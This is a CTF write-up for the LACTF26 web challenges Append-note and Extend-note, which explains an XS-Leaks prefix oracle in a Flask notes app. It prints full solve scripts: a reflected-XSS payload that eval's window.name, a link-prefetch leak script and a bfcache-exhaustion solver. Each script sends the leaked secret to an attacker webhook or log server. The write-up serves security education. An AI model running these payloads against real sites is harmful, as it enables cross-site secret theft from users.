---
title: "LACTF26-Web-Writeups | Append-notes & Extende-notes"
CTF: "LACTF26"
date: "2026-02-16"
description: "XS-Leaks Based challenge where you could use the oracle to leak the presence of the flag"
read: 8
image: /images/lactf26/logo.png
---


### **Author:** bliutech
#### CTF Name :LaCTF'26
#### No. of solves / Points : 8/376
#### **Challenge Description** :
Our distributed notes app is append optimized.Reads are eventually consistent with the heat death of the universe! :)

## Handout
There are just 3 main files to go through so lets just get that over with real quick.

- **`Dockerfile`**
```Dockerfile
FROM python:3.14-slim-bookworm

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 4000

CMD ["gunicorn", "-w", "1", "-b", "0.0.0.0:4000", "app:app"]
```

standard Dockerfile all it is doing is just installing all the requirements and exposing and running a guincorn server to run the server as such

- **`docker-compose`**
```yaml
services:
  append-note:
    build: .
    ports:
      - "4000:4000"

```
Well this is just for the ease of instanciating and the makes the handout more comfortable to be fair just mapping 4000 of local system to exposed 4000

-**`app.py`**
```python
import os, secrets
from urllib.parse import urlparse
from flask import Flask, render_template, request, make_response
import json

app = Flask(__name__)

ADMIN_SECRET = os.environ.get("ADMIN_SECRET", "password")
FLAG = os.environ.get("FLAG", "lactf{test}")
if (HOST := os.environ.get("HOST")):
    pass
elif (metadata := os.environ.get("INSTANCER_METADATA")):
    HOST = "https://" + json.loads(metadata)["http"]["app"]["4000"]
else:
    HOST = "http://localhost:4000"

SECRET = secrets.token_hex(4)
notes = [SECRET]


@app.after_request
def add_headers(response):
    response.headers["Cache-Control"] = "no-store"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "deny"
    return response


@app.route("/")
def index():
    is_admin = request.cookies.get("admin") == ADMIN_SECRET
    return render_template("index.html", is_admin=is_admin, url=HOST)


@app.route("/append")
def append():
    if request.cookies.get("admin") != ADMIN_SECRET:
        return "Unauthorized", 401

    content = request.args.get("content", "")
    redirect_url = request.args.get("url", "/")

    parsed_url = urlparse(redirect_url)
    if (
        parsed_url.scheme not in ["http", "https"]
        or parsed_url.hostname != urlparse(HOST).hostname
    ):
        return f"Invalid redirect URL {parsed_url.scheme} {parsed_url.hostname}", 400

    status = 200 if any(note.startswith(content) for note in notes) else 404
    notes.append(content)

    return render_template("redirect.html", url=redirect_url), status


@app.route("/flag")
def flag():
    correct = request.args.get("secret") == SECRET
    message = FLAG if correct else "Invalid secret"
    status = 200 if correct else 401
    response = make_response(message, status)
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4000)
```
And finally we have the app.py which is the entire working of the challenge where all the routes/endpoints are defined and where the bug/issue exists.

## Routes
![alt text](/images/lactf26/image.png)

![alt text](/images/lactf26/image-1.png)

## Initial Thoughts/Efforts
Alright we shall go over the app.py a bit more deeply because this is where everything lies.
We can Skip over the enviroment variables and the first few lines of the code 
```python
ADMIN_SECRET = os.environ.get("ADMIN_SECRET", "password")
FLAG = os.environ.get("FLAG", "lactf{test}")
if (HOST := os.environ.get("HOST")):
    pass
elif (metadata := os.environ.get("INSTANCER_METADATA")):
    HOST = "https://" + json.loads(metadata)["http"]["app"]["4000"]
else:
    HOST = "http://localhost:4000"
```
These are mainly to just setup the environment and all the proper hosts and Secrets as such

After which you can see 2 lines
```python
SECRET = secrets.token_hex(4)
notes = [SECRET]
```
Basically being that Secret is 4 bit long randomly generated secret and it is stored into the notes list as its first element , Why what is the relevancy we shall find out as the challenge proceeds

```python
@app.after_request
def add_headers(response):
    response.headers["Cache-Control"] = "no-store"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "deny"
    return response
```
After which there are these 3 response headers,Standard for this kind of challenges,Each of them preventing or avoiding a exploitation path ideally

`Cache-Control: no-store` → Tells the browser and intermediaries not to store the response anywhere, preventing sensitive data from being cached.

`X-Content-Type-Options: nosniff` → Prevents the browser from guessing **(MIME-sniffing)** the content type, forcing it to respect the declared Content-Type.

`X-Frame-Options: deny` → Blocks the page from being **embedded inside an iframe**, protecting against clickjacking attacks.


Alright before going any further I forgot to mention that this happens to be a admin-bot challenge meaning that the flag would ideally be something on the "admin" or a "bot with higher permissions" would be able to see so you would some how need to use him to exfiltrate the flag.

With that in mind we shall move ahead to see all the routes

```python
@app.route("/")
def index():
    is_admin = request.cookies.get("admin") == ADMIN_SECRET
    return render_template("index.html", is_admin=is_admin, url=HOST)
```
basically just renders a different kind of template file whether or not you happen to be admin,Since ADMIN_SECRET happens to be a environment variable the general consensus goes that you assume it is not-brutable and nothing weak.

```python
@app.route("/append")
def append():
    if request.cookies.get("admin") != ADMIN_SECRET:
        return "Unauthorized", 401

    content = request.args.get("content", "")
    redirect_url = request.args.get("url", "/")

    parsed_url = urlparse(redirect_url)
    if (
        parsed_url.scheme not in ["http", "https"]
        or parsed_url.hostname != urlparse(HOST).hostname
    ):
        return f"Invalid redirect URL {parsed_url.scheme} {parsed_url.hostname}", 400

    status = 200 if any(note.startswith(content) for note in notes) else 404
    notes.append(content)

    return render_template("redirect.html", url=redirect_url), status
```
Alright probably the major part of the challenge alone Endpoint clearly takes a content and redirect_url as get arguments and then parses the url using urlparse().

Mainly going through to 2 checks whether or not it starts with `http|https` and second one being whether parsed hostname is the same as the actual challenges hostname it was done so as to avoid a open-redirect vulnerability as such

After which comes a rather important line 
```python
status = 200 if any(note.startswith(content) for note in notes) else 404
```
![hehe neuron activation](/images/lactf26/image-2.png)

This kind of structure is rather common for a set of challenges with the concept of XS-Leaks.For context XS-Leaks are basically like vulnerabilities which originally derived from side-channels ,In Most cases you end up getting a "Oracle" which is of binary form that is "Yes" Or "No"

So in our case the oracle is rather straightforward it will return 200 if  my "secret" starts with the content I pass in the parameter

![oracle.jpg](/images/lactf26/oracle.jpg)

For anyone New to the Concept of XS-Leaks as such I would recommend you to go through **[XSLeaks](https://xsleaks.dev/)** Cause it explains it fairly properly and It is a great starting point 


Moving back to the challenge ,After having decided the Status it correspondingly redirects you your given url with that given status code.

Alright now coming to the last endpoint `/flag`
```python
@app.route("/flag")
def flag():
    correct = request.args.get("secret") == SECRET
    message = FLAG if correct else "Invalid secret"
    status = 200 if correct else 401
    response = make_response(message, status)
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response
```
Very Straightforward ,you can pass a paramter called secret and only if the value of this parameter is the same as the SECRET environement variable set would you be allowed to receive the flag else no

So Right away I knew that this challenge was going to be something like that of a normal XS-Leaks Challenges

The inital Idea was to get another challenge where there exists an XSS and then use that to help in leaking the secret 
![Full-Explanation](/images/lactf26/explain.png)


## Exploitation

It was only when I was halfway doing the above explained method is when i came to a realization as such (._.) , There exists a reflected XSS on this challenge page directly.
![donkey meme](/images/lactf26/donkey.png)

```python
return f"Invalid redirect URL {parsed_url.scheme} {parsed_url.hostname}",400
```
in complete retrospect this doesnt exactly look worrying but then you realize you have complete control over the parsed_url and in theory whatever happens to be shown here.

So this is how it ends up being shown to the admin bot 
![alt text](/images/lactf26/img1.png)
![alt text](/images/lactf26/img2.png)

So now this basically just made our job way easier than it should have been lmao

After that it was just about making a small script which helped leak the characters 1 at a time as such


## Solve-Script
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<script>
const ATTACKER_BASE_URL = '<webhook>';
const TARGET_BASE_URL = '<challenge_url>';

window.name = `
const ALPHABET = '0123456789abcdefghijklmnopqrstuvwxyz_';
const SECRET_LENGTH = 8;
let knownSecret = '';
(async () => {
    for (let i = 0; i < SECRET_LENGTH; i++) {
        for (const character of ALPHABET) {
            const content = knownSecret + character; 

            var response = await fetch(\`/append?content=\${content}&url=${TARGET_BASE_URL}/\`);
            if (response.status !== 200) {
                continue;
            }

            knownSecret += character;
            fetch(\`${ATTACKER_BASE_URL}/?log=\${knownSecret}\`);
            break;
        }
    }
})();
`;
const win = window.open(`${TARGET_BASE_URL}/append?content=&url=http://<img src onerror=eval(window.name)>/`, window.name);
</script>
</body>
</html>
```
You would end up getting the Secret from this and then eventually you can use that and get the flag

FLAG:`lactf{3V3n7U4LLy_C0N5I573N7_70_L34X}`


Of-course as my suspicions lead to me to believe that it was probably just a debugging statement which the author forgot to remove and lo and behold a few hours later `Extend-note` gets released which is a revenge challenge of the given challenge

# 

## Extend-Note The Revenge Challenge 
The only real difference between the two challenges end up coming down to 

```py
<         return f"Invalid redirect URL", 400
<
---
>         return f"Invalid redirect URL {parsed_url.scheme} {parsed_url.hostname}", 400
```

Well now that this was done ,We would go back to our old idea of using a challenge which already had an xss challenge and use that to leak the secret

Thankfully there were multiple challenges where there was just a free XSS lying around so I used the challenge Bloggler to do the exploit as such

![](/images/lactf26/why.png)

Alright So just a explanation of the exploit as such how it ends up working.
First, the XSS in Bloggler allowed my malicious JavaScript to execute in the admin’s browser. That script sent cross-origin requests to the challenge’s /append endpoint using <link> tags, which automatically included the admin’s cookie.
By observing whether onload fired (200) or failed (404), it learned whether each guessed prefix matched the secret.
This allowed the script to brute-force the 8-character hex secret one character at a time.

I sadly wasnt able to find my other html script but I found this script which was basically the same thing on discord by **Crazyman**

```js
  <script>
    const ATTACK_SERVER = "{{ ATTACK_SERVER }}"
    const LOG_SERVER = `${ATTACK_SERVER}/log`
    const post_log = (msg) => navigator.sendBeacon(LOG_SERVER, JSON.stringify(msg))

    const CHALL_URL = "{{ CHALL_URL }}"
    const CHARSET = '0123456789abcdef';
    const SECRET_LENGTH = 8;
    function insertLink(content, onload, onerror) {
      const link = document.createElement('link');
      link.rel = 'prefetch';
      link.href = `${CHALL_URL}/append?content=${content}&url=${CHALL_URL}`;
      if (onload) {
        link.onload = onload;
      }
      if (onerror) {
        link.onerror = onerror;
      }
      document.head.appendChild(link);
    }
    async function run() {
      let secret = '';
      post_log({ type: 'start' });
      while (secret.length < SECRET_LENGTH) {
        const ch = await new Promise((resolve) => {
          for (const c of CHARSET) {
            insertLink(secret + c, () => resolve(c))
          }
        });
        secret += ch;
        post_log({ type: 'progress', secret });
      }
      post_log({ type: "finished", secret });
      const flag = await fetch(`${CHALL_URL}/flag?secret=${secret}`).then(res => res.text());
      post_log({ type: "flag", flag })
    }

    window.addEventListener("DOMContentLoaded", run);
  </script>
```
![alt text](/images/lactf26/img3.png)

And well after giving that blog link to the admin bot
![alt text](/images/lactf26/img4.png)

FLAG:`lactf{1_R34LlY_n33D_T0_r3m3m83R_t0_R3M0V3_My_d38U9_5T4t3m3nt2}`



## Intended Solve
Alright now going to the Intended Solution was to use bfcache quota exhaustion xs-leak.

For the few of you who were also confused reading that the first time no worries (i was confused as well) but it is rather straightforward thing so lets start.


### **What is Bf-cache?**
bfcache (Back-Forward cache) is a browser optimization that stores full pages in memory when you navigate away from them,so when you press the back or forward arrow,the page could be restored instantly.

Like in easy words its like the browser freezing a memory so it can resume it later when required

**Why is this relevant?**

![alt text](/images/lactf26/hagrid.png)

Chrome keeps the last 6 pages you visited in bfcache as such
ie if you go back
- If the page is in bfcache -> it restores instantly
- If it was evicted -> it reloads normally

**Again Why do we care?**

Well because `/append` behaves differently 
- If guess is correct -> returns 200
- If wrong -> returns 404

The important part is that if a page returns 200 it is eligible for bfcache

So depending on whether the guess is correct `/append` may or may not enter bfcache

And its rather straightforward how you can do that as such
![alt text](/images/lactf26/explaination.png)

Since the bfcache buffer will only hold 6 pages we will make it visit 
- /start
- a -> b -> c -> d -> e
In theory filling the whole buffer so after which we will request for /append which will make it so that only if its 200 or 404 on the basis of its status will it be able to cached which we could decipher via the `event.persisted` method for /start since if a new tab is to get cached it will remove start and then get cached

I Do hope this made sense

## Author Solve Script

- **index.html**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solver</title>
</head>
<body>
<script type="module">
async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function log(msg) {
    console.log(msg);
    await fetch(`/log?msg=${encodeURIComponent(msg)}`);
}

async function oracle(guess) {
    const w = window.open(`/start?guess=${encodeURIComponent(guess)}`);

    let done = false;
    let result;
    while (!done) {
        const res = await fetch(`/get?key=${encodeURIComponent(guess)}`);
        result = await res.text();
        console.log(guess, result);
        done = result.length !== 0;
    }

    return result === 'true';
}

const TARGET = '$TARGET$';

const alpha = '0123456789abcdef';
const BATCH_SIZE = alpha.length / 2;

let nonce = '';
while (nonce.length !== 8) {
    let results = Array(alpha.length).fill(false);

    let curr = 0;
    for (let i = 0; i < alpha.length; i += 1) {
        const guess = nonce + alpha[i];
        results[i] = oracle(guess);
        curr++;

        if (curr >= BATCH_SIZE) {
            results = await Promise.all(results);
            curr = 0;
        }

        if (results.indexOf(true) !== -1) {
            break;
        }
    }

    const idx = results.indexOf(true);
    if (idx === -1 || results.filter(value => value).length !== 1) {
        // Defensive check for debugging.
        await log(results);
        break;
    }

    nonce += alpha[idx];
    await log(nonce);
}

if (nonce.length === 8) {
    const res = await fetch(`${TARGET}/flag?secret=${nonce}`);
    const flag = await res.text();
    await fetch(`/flag?flag=${encodeURIComponent(flag)}`);
}
</script>
</body>
</html>
```

- **index.js**
```js
import express from 'express';
import fs from "fs";

const app = express();
const port = 3000;

const TARGET = 'https://extend-note-pt4jh.instancer.lac.tf';

const index = fs.readFileSync("index.html", "utf8");

app.get('/', async (_, res) => {
  console.log('[INFO] Visited /');
  // Pacify RelatedActiveContentsExist and BrowsingInstanceNotSwapped
  res.header('Cross-Origin-Opener-Policy', 'same-origin');
  res.send(index.replace("$TARGET$", TARGET));
});

app.get('/start', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  // Disable disk cache
  res.header("Cache-Control", "no-store");
  res.send(`
  <script type="module">
    window.onpageshow = async function(event) {
      const visited = localStorage.getItem("${guess}") === 'true';
      if (!visited) {
        localStorage.setItem("${guess}", true);

        setTimeout(() => {
          window.location.href = '/a?guess=${encodeURIComponent(guess)}';
        }, 100);

        return;
      }
      
      // Can also use performance.getEntriesByType("navigation")[0]?.notRestoredReasons
      const oracle = !event.persisted;
      await fetch(\`/set?key=${encodeURIComponent(guess)}&value=\${oracle}\`);
      window.close();
    };
  </script>
  `);
});

app.get('/a', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '/b?guess=${encodeURIComponent(guess)}';
    }, 100);
  </script>
  `);
});

app.get('/b', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '/c?guess=${encodeURIComponent(guess)}';
    }, 100);
  </script>
  `);
});

app.get('/c', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '/d?guess=${encodeURIComponent(guess)}';
    }, 100);
  </script>
  `);
});

app.get('/d', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '/e?guess=${encodeURIComponent(guess)}';
    }, 100);
  </script>
  `);
});

app.get('/e', (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  const guess = req.query.guess;
  const target_url = new URL(TARGET);
  const redirect = `${target_url.protocol}//${req.host}\\@${target_url.host}`;
  res.send(`
  <script>
    setTimeout(() => {
      window.location.href = '${TARGET}/append?content=${encodeURIComponent(guess)}&url=${encodeURIComponent(redirect)}';
    }, 100);
  </script>
  `);
});

app.get(new RegExp(`^/@${new URL(TARGET).host}$`, "i"), (req, res) => {
  console.log(`[INFO] Visited ${req.originalUrl}`);

  res.type('html');
  res.send(`
  <script>
    window.history.go(-7);
  </script>
  `);
});

const results = new Map();

app.get('/get', (req, res) => {
  const { key } = req.query;
  const value = results.get(key);
  if (value !== undefined) {
    console.log(`[GET] ${key} = ${value}`);
  }
  res.send(value);
});

app.get('/set', (req, res) => {
  const {
    key,
    value
  } = req.query;

  results.set(key, value);

  console.log(`[SET] ${key} = ${value}`);

  res.send("ACK");
});

app.get('/log', (req, res) => {
  console.log(`[LOG] ${req.query.msg}`);
  res.send("ACK");
});

app.get('/flag', (req, _) => {
  console.log(`[FLAG] ${req.query.flag}`);
  process.exit(0);
});

app.listen(port, () => {
  console.log(`[INFO] Solver listening at http://localhost:3000`);
});
```



## Final Thoughts / Conclusions

Really neat challenge to be fair go to learn more about bfcache as such haven't seen much on that lately.Overall had a lot of fun and a lot learn.Props to the Author

Here is a really cool horse
![alt text](/images/lactf26/horse.png)

## References/Resources
1) **[Xs-leaks](https://xsleaks.dev/)**
2) **[Bfcache](https://web.dev/articles/bfcache)**
3) **[More Xs-leaks](https://angelica.gitbook.io/hacktricks/pentesting-web/xs-search)**